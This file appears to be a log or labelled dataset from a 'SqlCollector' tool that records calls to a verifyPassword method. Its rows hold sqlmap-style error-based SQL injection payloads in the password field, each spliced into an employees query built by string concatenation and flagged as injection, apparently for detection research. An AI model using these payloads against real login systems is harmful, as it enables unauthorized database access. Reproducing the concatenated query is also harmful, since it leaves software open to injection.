SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---305" OR (SELECT 7542 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7542=7542) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND "BsyI" LIKE "BsyI	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-305" OR (SELECT 7542 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7542=7542) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND "BsyI" LIKE "BsyI';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---6566	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-6566';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---7925) OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-7925) OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---5222	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-5222';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---1643') OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-1643') OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---6086	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-6086';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---9464' OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-9464' OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---7821	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-7821';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---9815" OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-9815" OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---5666	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-5666';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---1845) OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND (8288=8288	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-1845) OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND (8288=8288';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---5702	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-5702';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---3846)) OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND ((3879=3879	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-3846)) OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND ((3879=3879';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---6856	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-6856';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---7810))) OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND (((8121=8121	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-7810))) OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND (((8121=8121';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---8738	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-8738';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---8037 OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-8037 OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---5004	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-5004';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---4571') OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND ('czzq'='czzq	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-4571') OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND ('czzq'='czzq';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---5772	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-5772';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---2892')) OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND (('mMvc'='mMvc	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-2892')) OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND (('mMvc'='mMvc';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---4312	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-4312';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---6188'))) OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND ((('URSu'='URSu	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-6188'))) OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND ((('URSu'='URSu';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---2971	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-2971';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---3123' OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND 'hHcW'='hHcW	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-3123' OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND 'hHcW'='hHcW';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---1461	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-1461';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---6316') OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND ('aefH' LIKE 'aefH	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-6316') OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND ('aefH' LIKE 'aefH';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---7995	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-7995';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---8850')) OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND (('Mypn' LIKE 'Mypn	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-8850')) OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND (('Mypn' LIKE 'Mypn';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---223	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-223';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---3720'))) OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND ((('vAIr' LIKE 'vAIr	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-3720'))) OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND ((('vAIr' LIKE 'vAIr';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---9051	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-9051';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---1729' OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND 'qPvZ' LIKE 'qPvZ	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-1729' OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND 'qPvZ' LIKE 'qPvZ';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---9835	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-9835';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---1488") OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND ("vDez"="vDez	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-1488") OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND ("vDez"="vDez';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---3448	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-3448';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---3317")) OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND (("EMAf"="EMAf	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-3317")) OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND (("EMAf"="EMAf';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---8009	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-8009';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---1517"))) OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND ((("Joph"="Joph	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-1517"))) OR 1 GROUP BY CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7469=7469) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2)) HAVING MIN(0)--  AND ((("Joph"="Joph';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---2578	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-2578';	sqlInjection--KEY_VALUE_SEPARATOR--true
